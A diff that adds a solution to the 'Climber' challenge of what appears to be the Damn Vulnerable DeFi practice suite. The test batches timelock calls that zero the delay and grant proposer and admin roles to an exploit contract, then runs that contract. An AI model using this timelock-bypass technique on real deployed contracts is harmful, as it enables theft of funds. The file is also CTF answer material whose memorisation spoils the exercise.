@@ -4,9 +4,11 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
+import {PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {ExploitContract} from "./ExploitContract.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +87,32 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        // Updates the delay to zero and make exploit contract a proposer & admin
+
+        ExploitContract exploit = new ExploitContract(vault, timelock, address(token), recovery);
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 salt = bytes32("");
+
+        // timelock.updateDelay(0)
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeCall(timelock.updateDelay, 0);
+
+        // timelock.grantRole(PROPOSER_ROLE, address(exploit))
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(exploit)));
+
+        // timelock.grantRole(ADMIN_ROLE, address(exploit))
+        targets[2] = address(timelock);
+        dataElements[2] = abi.encodeCall(timelock.grantRole, (ADMIN_ROLE, address(exploit)));
+
+        // exploit.run()
+        targets[3] = address(exploit);
+        dataElements[3] = abi.encodeCall(exploit.run, ());
+
+        timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
